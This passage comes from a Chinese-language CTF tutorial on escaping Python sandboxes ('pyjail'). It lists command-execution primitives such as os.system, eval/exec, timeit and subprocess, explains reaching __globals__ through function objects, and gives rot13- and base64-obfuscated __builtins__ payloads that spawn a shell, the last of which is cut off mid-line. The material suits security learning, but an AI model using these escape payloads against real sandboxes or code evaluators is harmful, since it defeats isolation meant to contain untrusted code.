<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (self.__class__, (self.value,))</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__reduce_ex__</code></strong>：与 <code>__reduce__</code> 类似，但可以支持更多的协议版本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __reduce_ex__(self, protocol):</span><br><span class="line">        return (self.__class__, (self.value,))</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__repr__</code></strong>：返回对象的“官方”字符串表示形式。通常可以通过调用 <code>repr(object)</code> 来查看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return f&quot;Example(value=&#123;self.value&#125;)&quot;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__setattr__</code></strong>：当试图设置对象的属性时调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __setattr__(self, name, value):</span><br><span class="line">        print(f&quot;Setting attribute &#123;name&#125; to &#123;value&#125;&quot;)</span><br><span class="line">        super().__setattr__(name, value)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__sizeof__</code></strong>：返回对象占用的内存大小，通常由 <code>sys.getsizeof()</code> 调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Example:</span><br><span class="line">    def __sizeof__(self):</span><br><span class="line">        return object.__sizeof__(self) + sum(sys.getsizeof(v) for v in self.__dict__.values</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__subclasshook__</code></strong>：自定义类的子类检测逻辑。通常由 <code>issubclass()</code> 调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Base:</span><br><span class="line">    @classmethod</span><br><span class="line">    def __subclasshook__(cls, subclass):</span><br><span class="line">        return hasattr(subclass, &#x27;custom_method&#x27;)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong><code>__weakref__</code></strong>：用于支持弱引用，如果类中没有 <code>__slots__</code> 属性，则对象的弱引用字典会自动包含此属性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import weakref</span><br><span class="line"></span><br><span class="line">class Example:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">obj = Example()</span><br><span class="line">r = weakref.ref(obj)</span><br><span class="line">print(r)  # &lt;weakref at 0x...; to &#x27;Example&#x27; at 0x...&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="Pyjail中常用的魔术方法">Pyjail中常用的魔术方法</h4>
<ul>
<li>
<p><code>__class__</code>能返回当前对象所属的类，例如<code>''.__class__</code>会返回它的类<code>&lt;class 'str'&gt;</code>，对于<code>''.__class__(123)</code>就等价于<code>str(123)</code>。</p>
</li>
<li>
<p><code>__base__</code>能返回当前类的基类，例如<code>str.__base__</code>就是<code>&lt;class 'object'&gt;</code>。</p>
</li>
<li>
<p><code>__import__</code>：载入模块的函数。例如<code>import os</code>等价于<code>os = __import__('os')</code>；</p>
</li>
<li>
<p><code>__name__</code>：该变量指示当前运行环境位于哪个模块中。如我们python一般写的<code>if __name__ == '__main__':</code>，就是来判断是否是直接运行该脚本。如果是从另外的地方import的该脚本的话，那<code>__name__</code>就不为<code>__main__</code>，就不会执行之后的代码。</p>
</li>
<li>
<p><code>__builtins__</code>：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如<code>str</code>、<code>chr</code>、<code>ord</code>、<code>dict</code>、<code>dir</code>等。在pyjail的沙箱中，往往<code>__builtins__</code>被置为<code>None</code>，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到<code>__builtins__</code>，再<code>__import__('os').system('sh')</code>进行RCE（远程代码执行Remote Code Execution）；</p>
</li>
<li>
<p><code>__file__</code>：该变量指示当前运行代码所在路径。如<code>open(__file__).read()</code>就是读取当前运行的python文件代码。需要注意的是，<strong>该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量</strong>；</p>
</li>
<li>
<p><code>_</code>：该变量返回上一次运行的python语句结果。需要注意的是，<strong>该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量</strong>。</p>
</li>
</ul>
<h4 id="Pyjail中常用的函数和模块">Pyjail中常用的函数和模块</h4>
<h5 id="import-函数">import 函数</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;dir&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="exec-eval-函数">exec &amp; eval 函数</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="execfile-函数">execfile 函数</h5>
<p>执行文件，主要用于引入模块来执行命令<br>
python3不存在</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;execfile(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;system(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;getcwd() <span class="comment"># 等同于pwd</span></span><br></pre></td></tr></table></figure>
<h5 id="timeit-函数-from-timeit-模块">timeit 函数 from timeit 模块</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><code>timeit</code> 是一个 Python 内置模块，用于计时小段代码的执行时间。它提供了一种简单的方法来测量代码的性能，非常适合用于基准测试（benchmarking)。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m timeit &quot;x = sum(range(1000))&quot; //这将输出多次执行该代码段的平均时间。</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个函数来计时</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="built_in">range</span>(<span class="number">1000</span>)) <span class="comment"># tip sum(iterable, start=0)小用法</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 timeit.timeit 计时</span></span><br><span class="line">execution_time = timeit.timeit(<span class="string">&quot;example()&quot;</span>, <span class="built_in">globals</span>=<span class="built_in">globals</span>(), number=<span class="number">1000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Execution time: <span class="subst">&#123;execution_time&#125;</span> seconds&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 timeit.timeit() 中传递一段代码字符串时，这段代码默认在一个新的、干净的命名空间中执行。这意味着它无法访问当前脚本中的任何变量、函数或导入的模块。通过指定 globals=globals()，可以让这段代码在当前脚本的全局命名空间中执行，从而访问当前脚本中的变量和函数。</span></span><br></pre></td></tr></table></figure>
<h5 id="platform-模块">platform 模块</h5>
<blockquote>
<p>注意这个只在__py2__生效，py3用了subprocess</p>
</blockquote>
<p>platform提供了很多方法去获取操作系统的信息，popen函数可以执行任意命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform </span><br><span class="line"><span class="built_in">print</span> platform.popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h5 id="commands-模块">commands 模块</h5>
<blockquote>
<p>这个同样在py2才行</p>
</blockquote>
<p>依旧可以用来执行部分指令，貌似不可以拿shell，但其他的很多都可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="built_in">print</span> commands.getoutput(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> commands.getstatusoutput(<span class="string">&quot;dir&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="subprocess模块">subprocess模块</h5>
<p>py3集大成之模块</p>
<p>shell=True 命令本身被bash启动，支持shell启动，否则不支持</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.call([<span class="string">&#x27;ls&#x27;</span>],shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&quot;dir&quot;</span>)</span><br><span class="line">subprocess.check_output([<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]) <span class="comment"># py2</span></span><br><span class="line">subprocess.run([<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;/&#x27;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>) </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">capture_output=True 表示捕获标准输出和标准错误。</span></span><br><span class="line"><span class="string">text=True 表示将输出作为字符串处理，而不是字节。</span></span><br><span class="line"><span class="string">check=True 表示如果命令返回非零退出状态，将引发 subprocess.CalledProcessError 异常。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess  <span class="comment"># py3</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = subprocess.run([<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;/&#x27;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, check=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Command output:\n&quot;</span>, result.stdout)</span><br><span class="line"><span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Command failed with error:\n&quot;</span>, e.stderr)</span><br></pre></td></tr></table></figure>
<h5 id="compile-函数">compile 函数</h5>
<p>compile() 函数将一个字符串编译为字节代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">compile</span>(source, filename, mode[, flags[, dont_inherit]])</span><br></pre></td></tr></table></figure>
<ul>
<li>source – 字符串或者AST（Abstract Syntax Trees）对象（抽象语法树）</li>
<li>filename – 代码文件名称，如果不是从文件读取代码则传递一些可辨认的值</li>
<li>mode – 指定编译代码的种类。可以指定为 <code>exec</code> ,<code>eval</code>, <code>single</code>
<ol>
<li><code>exec</code>：可以包含一系列语句（包括复合语句，如函数定义）。</li>
<li><code>eval</code>：只能包含单个表达式。</li>
<li><code>single</code>：可以包含单个语句。</li>
</ol>
</li>
<li>flags – 变量作用域，局部命名空间，如果被提供，可以是任何映射对象</li>
<li>flags和dont_inherit是用来控制编译源码时的标志</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="built_in">str</span> = <span class="string">&quot;for i in range(0,10): print(i)&quot;</span> </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="built_in">compile</span>(<span class="built_in">str</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>)   <span class="comment"># 编译为字节代码对象 </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line">&lt;code <span class="built_in">object</span> &lt;module&gt; at <span class="number">0x10141e0b0</span>, file <span class="string">&quot;&quot;</span>, line <span class="number">1</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(c)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span> = <span class="string">&quot;3 * 4 + 5&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="built_in">compile</span>(<span class="built_in">str</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(a)</span><br><span class="line"><span class="number">17</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">source_code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def greet(name):</span></span><br><span class="line"><span class="string">    return &#x27;Hello, &#x27; + name</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(greet(&#x27;World&#x27;))</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">code_object = <span class="built_in">compile</span>(source_code, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code_object)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>生成动态命令：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义要执行的命令</span></span><br><span class="line">command = <span class="string">&quot;ls /&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 compile 编译命令字符串</span></span><br><span class="line">compiled_command = <span class="built_in">compile</span>(<span class="string">f&quot;subprocess.getoutput(&#x27;<span class="subst">&#123;command&#125;</span>&#x27;)&quot;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 eval 执行编译后的命令</span></span><br><span class="line">output = <span class="built_in">eval</span>(compiled_command)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>
<h5 id="fstring（f修饰符-py-3-6）">fstring（f修饰符 py&gt;3.6）</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line"><span class="string">F&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印所有命令行参数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;All command line arguments:&quot;</span>, sys.argv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印脚本名称</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Script name:&quot;</span>, sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印传递给脚本的参数</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Arguments passed to the script:&quot;</span>, sys.argv[<span class="number">1</span>:])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No arguments were passed to the script.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (ctf) ➜  python_test python test.py 1 2 3</span></span><br><span class="line"><span class="comment"># All command line arguments: [&#x27;test.py&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;]</span></span><br><span class="line"><span class="comment"># Script name: test.py</span></span><br><span class="line"><span class="comment"># Arguments passed to the script: [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;]</span></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正常退出</span></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 非正常退出，返回错误码 1</span></span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印模块搜索路径</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Module search paths:&quot;</span>, sys.path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Module search paths: [&#x27;/home/void2eye/python_test&#x27;, &#x27;/usr/lib/python310.zip&#x27;, &#x27;/usr/lib/python3.10&#x27;, &#x27;/usr/lib/python3.10/lib-dynload&#x27;, &#x27;/usr/local/lib/python3.10/dist-packages&#x27;, &#x27;/usr/lib/python3/dist-packages&#x27;]</span></span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line"><span class="comment"># sys.stdin, sys.stdout 和 sys.stderr 分别表示标准输入、标准输出和标准错误流。可以重定向这些流。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重定向标准输出</span></span><br><span class="line">sys.stdout = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;This will be written to the file output.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复标准输出</span></span><br><span class="line">sys.stdout = sys.__stdout__</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;This will be printed to the console&quot;</span>)</span><br><span class="line"></span><br><span class="line">-----------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印 Python 版本信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Python version:&quot;</span>, sys.version)</span><br></pre></td></tr></table></figure>
<h5 id="file-函数">file 函数</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">&#x27;flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h5 id="open-函数">open 函数</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h5 id="codecs模块">codecs模块</h5>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line">codecs.<span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h5 id="Filetype-函数-from-types-模块">Filetype 函数 from types 模块</h5>
<p>可以用来读取文件</p>
<blockquote>
<p>只能在py2里面用</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="built_in">print</span> types.FileType(<span class="string">&quot;flag&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<h3 id="更加深入的理解Python魔术方法">更加深入的理解Python魔术方法</h3>
<p>我们先看一个报错</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241022173651605.png"
                        alt="image-20241022173651605"
                 ></p>
<p>在 Python 中，<code>__init__</code> 方法属于类的实例方法，但它本质上是通过 <code>method-wrapper</code> 或 <code>wrapper_descriptor</code> 实现的特殊方法，而不是常规的函数对象。这就是为什么在访问 <code>__init__</code> 的时候会看到 <code>method-wrapper</code>，并且无法访问像 <code>__globals__</code> 这样的属性。</p>
<p><strong><code>__init__</code> 是一个特殊方法</strong>： <code>__init__</code> 是类的构造函数（初始化方法），它是一个绑定方法，调用时由 Python 自动处理。这种特殊的绑定方法不像普通的函数或方法那样包含 <code>__globals__</code> 属性，因为它是通过内部机制实现的，而不是像常规函数那样存在于全局命名空间。</p>
<p><strong>绑定方法和 <code>method-wrapper</code></strong>： 通过 <code>obj.__init__</code> 访问 <code>__init__</code> 实际上返回的是一个绑定到对象的 <code>method-wrapper</code>，它是 Python 的一种优化机制，用于类的魔法方法。<code>method-wrapper</code> 并不暴露 <code>__globals__</code> 属性，因为它与普通函数不同，不能直接通过 <code>globals()</code> 访问其全局变量。</p>
<p><strong><code>__globals__</code> 仅适用于函数对象</strong>： 只有普通的函数对象（如通过 <code>def</code> 定义的函数）才会有 <code>__globals__</code> 属性，表示它们所在的全局命名空间。Python 的内建方法（如 <code>__init__</code>）是用 <code>C</code> 实现的，属于特殊的 <code>method-wrapper</code>，因此不具备 <code>__globals__</code> 属性。</p>
<blockquote>
<p>重点在第三点，能够有globals属性的必须是def定义的函数（lambda也可以</p>
</blockquote>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241022174223178.png"
                        alt="image-20241022174223178"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241022174511612.png"
                        alt="image-20241022174511612"
                 ></p>
<p>很清晰了，函数能直接访问他<code>所在模块</code>的所有变量和属性，你看test3已经访问到了之前定义的匿名函数。</p>
<blockquote>
<p>所以我们的目的一般都是通过访问类或者<code>类</code>的<code>实例</code>来访问函数的globals属性</p>
</blockquote>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241022174549243.png"
                        alt="image-20241022174549243"
                 ></p>
<ul>
<li>注意跳板为实例的时候，必须得访问__class__来访问到他的类。</li>
</ul>
<h4 id="总结">总结</h4>
<p>Python 的内置魔法方法（如 <code>__init__</code>）是特殊的绑定方法（<code>method-wrapper</code>），不具备 <code>__globals__</code> 属性。</p>
<p>只有通过 <code>def</code> 定义的普通函数和方法才具有 <code>__globals__</code> 属性，表示它们的全局命名空间。</p>
<p>要访问 <code>__globals__</code>，请确保操作的对象是常规的函数或方法对象，而不是内建的魔法方法。</p>
<h3 id="Pyjail绕过方法">Pyjail绕过方法</h3>
<h4 id="内联函数decode">内联函数decode</h4>
<p>因为<strong>import</strong>函数本身是用来动态的导入模块，比如：<code>import(module)</code> 或者 <code>import module</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">__import__</span>(<span class="string">&quot;bf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>))       <span class="comment">#import os</span></span><br><span class="line"><span class="comment"># 注意只有py2才能这么写，py3里的str类是没有decode的方法的，且py3的decode改为从字节数据到字符串的转换</span></span><br><span class="line">a.system(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>所以py3要么自己写解码脚本，要么用codecs库，其提供了一种编码和解码数据流的接口</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = __import__(codecs.decode(&#x27;bf&#x27;, &#x27;rot_13&#x27;))</span><br></pre></td></tr></table></figure>
<h4 id="builtins函数"><code>builtins函数 </code></h4>
<p>该函数模块中的函数都被自动引入，不需要再单独引入) , <code>dir(__builtins__)</code> 查看剩余可用内置函数</p>
<p>一个模块对象有一个由字典对象实现的命名空间，属性引用被转换为这个字典中的查找，例如，<code>m.x</code>等同于<code>m.__dict__[“x”]</code>,我们就可以用一些编码来绕过字符明文检测。</p>
<p>所以可以有</p>
<blockquote>
<p>注意，py3中的<code>base64</code> 编码和解码需要处理的是 <code>bytes</code> 对象，而不是 <code>str</code> 对象</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;sh&#x27;</span>)    <span class="comment"># py2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__builtins__.__dict__[codecs.decode(<span class="string">b&#x27;X19pbXBvcnRfXw==&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)](codecs.decode(<span class="string">b&#x27;b3M=&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)).system(<span 